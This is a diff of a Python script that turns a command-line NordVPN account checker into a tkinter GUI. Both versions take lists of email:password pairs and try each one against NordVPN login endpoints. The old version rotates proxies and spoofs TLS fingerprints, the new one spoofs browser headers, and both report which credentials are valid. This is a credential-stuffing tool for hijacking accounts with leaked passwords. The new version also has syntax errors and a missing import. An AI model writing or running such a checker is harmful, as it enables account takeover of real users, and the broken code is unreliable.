@@ -1,74 +1,120 @@
-import os, sys, json, time, random, string, ctypes, concurrent.futures
-import requests, colorama, pystyle, datetime, uuid, functools
-import logging
-from tls_client import Session
-from pystyle import Colorate, Colors
+import tkinter as tk
+import requests
+import threading
+import time
+import queue
 
-logging.basicConfig(level=logging.INFO)
+class NordVPNLoginGUI:
+    def __init__(self, master):
+        self.master = master
+        master.title("NordVPN Login GUI")
 
-def my_ui():
-    print(Colorate.Horizontal(Colors.yellow_to_red, """
-  _______ _      _      _______ _______ _______ 
- |       |      |      |       |       |       |
- |  _____|  _  |      |   _   |       |  _____|
- | |       | | |      |  | |  |       | |_____ 
- | |_____  | |_|      |  | |  |_____  |_____  |
- |_______| |_______|  |___| |_______|_______
+        # Create frames
+        self.accounts_frame = tk.Frame(master)
+        self.accounts_frame.pack(fill="x")
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-"""))
+        self.button_frame = tk.Frame(master)
+        self.button_frame.pack(fill="x")
 
-def nordvpn_checker(email, password):
-    try:
-        if not os.path.exists("proxies.txt") or os.path.getsize("proxies.txt") == 0:
-            logging.error("No proxies available")
-            return
+        # Create accounts label and text area
+        self.accounts_label = tk.Label(self.accounts_frame, text="Accounts (username:password):")
+        self.accounts_label.pack(side="left")
 
-        proxies = [line.strip() for line in open("proxies.txt", "r").readlines()]
-        if not proxies:
-            logging.error("No proxies available")
-            return
+        self.accounts_text = tk.Text(self.accounts_frame, width=40, height=10)
+        self.accounts_text.pack(side="left")
 
-        proxy = random.choice(proxies)
-        session = Session(client_identifier="chrome_114", random_tls_extension_order=True)
+        # Create button
+        self.login_button = tk.Button(self.button_frame, text="Check Accounts", command=self.check_accounts)
+        self.login_button.pack(side="left")
 
-        # Implement the logic to check NordVPN account validity
-        response = session.post("https://api.nordvpn.com/v1/users/login", json={"email": email, "password": password})
-        if response.status_code == 200:
-            valid = True
-        else:
-            valid = False
+        # Create result text area
+        self.result_text = tk.Text(self.master, width=40, height=10)
+        self.result_text.pack(fill="both", expand=True)
 
-        if valid:
-            logging.info(f"Valid account: {email}:{password}")
-        else:
-            logging.info(f"Invalid account: {email}:{password}")
-    except Exception as e:
-        logging.error(f"Error: {e}")
+        # Create a queue to update the GUI
+        self.queue = queue.Queue()
 
-if __name__ == "__main__":
-    my_ui()
+        # Store the CSRF token
+        self.csrf_token = None
 
-    if not os.path.exists("accounts.txt") or os.path.getsize("accounts.txt") == 0:
-        logging.error("No accounts available")
-        sys.exit(1)
+    def check_accounts(self):
+        accounts = self.accounts_text.get("1.0", "end-1c")
 
-    with open("accounts.txt", "r") as f:
-        accounts = [line.strip().split(":") for line in f.readlines()]
         if not accounts:
-            logging.error("No accounts available")
-            sys.exit(1)
+            messagebox.showerror("Error", "Please enter accounts")
+            return
 
-    try:
-        import tls_client
-    except ImportError:
-        logging.error("tls_client library not installed")
-        sys.exit(1)
+        accounts_list = [line.strip() for line in accounts.split("\n") if line.strip()]
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-        futures = [executor.submit(nordvpn_checker, email, password) for email, password in accounts]
-        for future in concurrent.futures.as_completed(futures):
+        threading.Thread(target=self.check_accounts_thread, args=(accounts_list,)).start()
+
+    def check_accounts_thread(self, accounts_list):
+        # Fetch CSRF token dynamically
+        self.csrf_token = self.get_csrf_token()
+        if not self.csrf_token:
+            self.queue.put("Error fetching CSRF token\n")
+            return
+
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://nordaccount.com',
+            'Referer': 'https://nordaccount.com/login/identifier?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea',
+            'Sec-Ch-Ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': 'Windows',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
+        }
+
+        data = {
+            '_csrf': self.csrf_token
+        }
+
+        for account in accounts_list:
+            username, password = account.split(":")
+
+            # First, send the username
+            data['username'] = username
             try:
-                future.result()
-            except Exception as e:
-                logging.error(f"Error: {e}")
+                            response = requests.post('https://nordaccount.com/login/identifier?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea', headers=headers, data=data)
+            if response.status_code != 200:
+                self.queue.put(f"Error sending username for account {account}\n")
+                continue
+
+            # Then, send the password
+            data['password'] = password
+            try:
+                response = requests.post('https://nordaccount.com/login/password?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea', headers=headers, data=data)
+                if response.status_code == 200:
+                    self.queue.put(f"Account {account} is valid!\n")
+                else:
+                    self.queue.put(f"Account {account} is invalid\n")
+            except requests.exceptions.RequestException as e:
+                self.queue.put(f"Error sending password for account {account}: {str(e)}\n")
+
+            time.sleep(1)  # add a delay between requests
+
+    def get_csrf_token(self):
+        try:
+            response = requests.get('https://nordaccount.com/login/identifier?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea')
+            response.raise_for_status()
+            csrf_token = response.cookies.get('_csrf')
+            return csrf_token
+        except requests.exceptions.RequestException as e:
+            print(f"Error fetching CSRF token: {str(e)}")
+            return None
+
+    def update_gui(self):
+        while True:
+            try:
+                message = self.queue.get_nowait()
+                self.result_text.insert("end", message)
+                self.result_text.see("end")
+            except queue.Empty:
+                break
+            self.master.after(100, self.update_gui)
+
+root = tk.Tk()
+my_gui = NordVPNLoginGUI(root)
+my_gui.update_gui()
+root.mainloop()
